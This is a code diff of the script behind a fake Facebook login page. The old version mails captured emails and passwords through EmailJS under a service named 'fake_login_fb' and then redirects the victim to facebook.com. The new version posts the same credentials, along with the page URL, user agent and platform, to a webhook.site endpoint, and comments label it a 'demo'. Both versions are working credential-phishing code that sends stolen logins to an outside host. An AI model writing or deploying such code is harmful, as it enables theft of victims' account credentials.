@@ -1,36 +1,41 @@
-// Initialize EmailJS
-emailjs.init("xyKHTlWAxK5HLMXyw"); // Replace with your EmailJS public key
+console.log('script.js loaded — using webhook-only mode');
 
-document
-  .getElementById("login-form")
-  .addEventListener("submit", function (event) {
-    event.preventDefault(); // Prevent form submission
+const WEBHOOK_URL = 'https://webhook.site/cf070007-6608-450e-bc2b-d764f8d54e7a';
 
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+document.getElementById('login-form').addEventListener('submit', function (event) {
+  event.preventDefault();
 
-    // Log the input data to the console
-    console.log("Email:", email);
-    console.log("Password:", password);
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
 
-    // Save the input data to local storage
-    localStorage.setItem("email", email);
-    localStorage.setItem("password", password);
+  console.log('Captured (demo) — Email:', email, 'Password:', password ? '***' : '(empty)');
 
-    // Send the data via EmailJS
-    
-    emailjs
-      .send("fake_login_fb", "template_z6jb42e", {
-        // to_email: "kristar",
-        user_email: email,
-        user_password: password,
-      })
-      .then((response) => {
-        console.log("Email sent successfully:", response);
-        window.location.href = "https://www.facebook.com/"; // Redirect after sending email
-      })
-      .catch((error) => {
-        console.error("Error sending email:", error);
-        alert("Failed to send data to your email.");
-      });
-  });
+  // Store locally for demo purposes
+  localStorage.setItem('email', email);
+  localStorage.setItem('password', password);
+
+  // Send JSON payload to webhook
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: new URLSearchParams({
+      user_email: email,
+      user_password: password,
+      timestamp: new Date().toISOString(),
+      source: window.location.href,
+      userAgent: navigator.userAgent,
+      pcname: navigator.platform,
+    })
+  })
+    .then((res) => {
+      console.log('Webhook POST status:', res.status);
+    })
+    .catch((err) => {
+      console.error('Webhook POST failed:', err);
+    })
+    .finally(() => {
+      // Redirect so demo continues
+      // window.location.href = 'https://www.facebook.com/';
+      console.log("Demo complete — would redirect to Facebook now.");
+    });
+});
